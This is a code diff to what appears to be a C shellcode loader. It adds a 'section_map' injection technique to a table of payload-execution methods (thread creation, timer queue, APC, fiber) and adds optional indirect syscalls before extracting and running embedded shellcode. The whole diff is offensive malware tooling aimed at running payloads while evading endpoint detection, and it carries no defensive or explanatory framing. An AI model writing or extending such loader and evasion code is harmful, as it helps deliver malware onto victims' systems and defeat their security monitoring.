@@ -1,8 +1,12 @@
+#include "config.h"
 #include <stdlib.h>
 #include <string.h>
 #include "dispatch.h"
 #include "payload.h"
 #include "techniques.h"
+#if USE_INDIRECT_SYSCALLS
+#include "syscalls.h"
+#endif
 
 static technique_t techniques[] = {
     { "createthread",  tech_createthread },
@@ -10,13 +14,10 @@ static technique_t techniques[] = {
     { "timer_queue",   tech_timer_queue  },
     { "apc_self",      tech_apc_self     },
     { "fiber",         tech_fiber        },
+    { "section_map",   tech_section_map  },
 };
 
 #define NUM_TECHNIQUES (sizeof(techniques) / sizeof(techniques[0]))
-
-#ifndef DEFAULT_TECHNIQUE
-#define DEFAULT_TECHNIQUE 0
-#endif
 
 int main(int argc, char **argv) {
     int tech_idx = DEFAULT_TECHNIQUE;
@@ -28,6 +29,10 @@ int main(int argc, char **argv) {
 
     if (tech_idx < 0 || tech_idx >= (int)NUM_TECHNIQUES)
         return 1;
+
+#if USE_INDIRECT_SYSCALLS
+    syscalls_init();
+#endif
 
     size_t sc_len = 0;
     unsigned char *sc = ldr_extract_shellcode(&sc_len);
